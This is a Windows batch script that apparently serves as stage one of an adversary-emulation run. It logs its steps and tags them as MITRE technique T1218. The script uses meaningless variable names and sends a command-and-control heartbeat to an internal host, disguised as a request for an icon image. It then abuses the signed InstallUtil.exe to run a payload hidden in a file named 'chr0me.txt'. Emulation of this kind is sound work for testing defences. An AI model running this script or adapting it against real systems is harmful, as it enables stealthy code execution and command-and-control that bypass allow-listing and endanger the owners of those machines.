@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
REM Random constant names with PHR_ as values
SET zxcvb=%APPDATA%\8489\11ec4535
SET lkjhg=https://10.0.0.49
SET qwert=https://10.0.0.49/stage/2/icon.png?8489-7
SET mnbvc=ITZEL-S2B
SET asdfg=7
SET poiuy=chr0me.txt
SET wertyu=8489

REM Derived variables for logging
SET logfile=%APPDATA%\!asdfg!\macula-simulations.log
SET tempdir=%APPDATA%\!asdfg!
SET installutilpath=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe

REM Debug: Script start
echo [%DATE% %TIME%][DEBUG][!mnbvc!]: script_start=stage1>> "!logfile!" 2>nul

REM 1. C2 HEARTBEAT (first task)
echo [%DATE% %TIME%][DEBUG][!mnbvc!]: heartbeat_start=!qwert!>> "!logfile!" 2>nul
curl -k -s -o nul "!qwert!"
if !errorlevel! equ 0 (
    echo [%DATE% %TIME%][DEBUG][!mnbvc!]: heartbeat_complete=success>> "!logfile!" 2>nul
) else (
    echo [%DATE% %TIME%][DEBUG][!mnbvc!]: heartbeat_complete=failed_errorlevel_!errorlevel!>> "!logfile!" 2>nul
)

REM 2. Change to output directory
echo [%DATE% %TIME%][DEBUG][!mnbvc!]: chdir_start=!zxcvb!>> "!logfile!" 2>nul
cd /d "!zxcvb!" 2>nul
if !errorlevel! equ 0 (
    echo [%DATE% %TIME%][DEBUG][!mnbvc!]: chdir_complete=success>> "!logfile!" 2>nul
) else (
    echo [%DATE% %TIME%][DEBUG][!mnbvc!]: chdir_complete=failed_errorlevel_!errorlevel!>> "!logfile!" 2>nul
)

REM 3. Execute InstallUtil
echo [%DATE% %TIME%][DEBUG][!mnbvc!]: installutil_start=!poiuy!>> "!logfile!" 2>nul
"!installutilpath!" /logfile= /LogToConsole=false /U "!poiuy!"
SET installutil_result=!errorlevel!
echo [%DATE% %TIME%][DEBUG][!mnbvc!]: installutil_complete=exitcode_!installutil_result!>> "!logfile!" 2>nul

REM TTP logging for T1218
SET RESULT=1
SET ERR_DETAIL=
if not !installutil_result! equ 0 (
    SET RESULT=0
    SET ERR_DETAIL=exitcode_!installutil_result!
)
SET ttp_timestamp=%DATE:~10,4%-%DATE:~4,2%-%DATE:~7,2% %TIME:~0,2%:%TIME:~3,2%:%TIME:~6,2%.%TIME:~9,2%
echo [!ttp_timestamp!][!mnbvc!]: !asdfg!-!wertyu!-T1218|Signed Binary Proxy Execution=!RESULT!:!ERR_DETAIL!>> "!logfile!" 2>nul

REM Debug: Script end
echo [%DATE% %TIME%][DEBUG][!mnbvc!]: script_end=stage1>> "!logfile!" 2>nul

ENDLOCAL
exit /b 0